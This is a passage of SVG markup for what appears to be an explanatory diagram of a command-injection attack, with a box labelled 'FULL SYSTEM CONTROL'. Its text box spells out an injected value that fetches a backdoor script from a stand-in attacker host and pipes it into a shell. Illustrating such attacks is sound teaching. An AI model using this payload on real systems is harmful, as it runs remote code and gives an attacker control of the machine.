98.83 758.82 104.74 757.28 106.42" fill="#d60000"/><rect x="742.51" y="261.51" width="29.45" height="37.3" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="752.56" y1="261.63" x2="752.56" y2="298.93" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="265.66" x2="771.96" y2="265.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="762.68" y1="261.51" x2="762.68" y2="298.81" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="525.09" y="187.81" width="77.32" height="53.71" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><polyline points="258.95 253.07 237.94 253.07 237.94 183.67 225.59 183.67 225.59 118.44 195.22 118.44 195.22 89.34" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><polyline points="143.44 354.35 179.72 354.35 179.72 272.82 155.23 272.82 155.23 155.03 126.71 155.03 126.71 131.44 78.21 131.44 78.21 93.14" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><polygon points="231.59 146.66 225.59 155.47 219.59 146.47 231.59 146.66" fill="#cbd0d1"/><polygon points="243.99 218.07 237.99 226.88 231.99 217.88 243.99 218.07" fill="#cbd0d1"/><polygon points="254.63 247.32 263.45 253.32 254.45 259.32 254.63 247.32" fill="#cbd0d1"/><polygon points="72.55 98.16 78.55 89.34 84.55 98.34 72.55 98.16" fill="#cbd0d1"/><polygon points="149.36 215.08 155.36 206.27 161.36 215.27 149.36 215.08" fill="#cbd0d1"/><rect x="263.91" y="162.34" width="143.11" height="131.78" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><polyline points="387.7 -0.91 387.7 8.29 414.02 8.29 414.02 -0.91" fill="none" stroke="#ebf0f2" stroke-miterlimit="10"/><text transform="translate(531.3 204.38)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">FUL<tspan x="23.33" y="0" letter-spacing="-0.02em">L</tspan><tspan x="30.44" y="0"> </tspan><tspan x="0" y="14.4">SYSTEM </tspan><tspan x="0" y="28.8">CONTRO</tspan><tspan x="52" y="28.8" letter-spacing="-0.02em">L</tspan></text><path d="M595.44,204.61l.81-4-1.92-.39a6.65,6.65,0,0,0-.16-.91l1.63-1.08-2.22-3.37L592,196a8.23,8.23,0,0,0-.78-.53l.39-1.89-4-.82-.39,1.9a7.12,7.12,0,0,0-.92.18l-1.07-1.62-3.37,2.22,1.08,1.63a6.92,6.92,0,0,0-.52.77l-1.92-.39-.81,3.95,1.94.4a6.68,6.68,0,0,0,.18.89l-1.66,1.09,2.22,3.37,1.67-1.1a6.32,6.32,0,0,0,.74.49l-.4,2,4,.81.4-2a6.49,6.49,0,0,0,.88-.16l1.1,1.67,3.36-2.22L593,205a4.94,4.94,0,0,0,.51-.75Zm-4.2-2.93a3.4,3.4,0,0,1-3.32,2.71,2.46,2.46,0,0,1-.6-.07,3.4,3.4,0,0,1-2.64-4,3.31,3.31,0,0,1,3.92-2.64,3.4,3.4,0,0,1,2.64,4Z" fill="#d60000"/><line x1="742.51" y1="268.66" x2="771.96" y2="268.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="271.66" x2="771.96" y2="271.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="274.66" x2="771.96" y2="274.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="277.66" x2="771.96" y2="277.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="280.66" x2="771.96" y2="280.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="283.66" x2="771.96" y2="283.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="286.66" x2="771.96" y2="286.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="289.66" x2="771.96" y2="289.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="292.66" x2="771.96" y2="292.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="742.51" y1="295.66" x2="771.96" y2="295.66" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="16.19" y="58.31" width="420.07" height="30" fill="#ebf0f2" stroke="#4c5054" stroke-miterlimit="10"/><text transform="translate(22.4 77.63)" font-size="14" fill="#333332" font-family="Courier-Bold, Courier" font-weight="700">$(curl https://web-attacker.com/backdoor.sh | sh)</text></svg>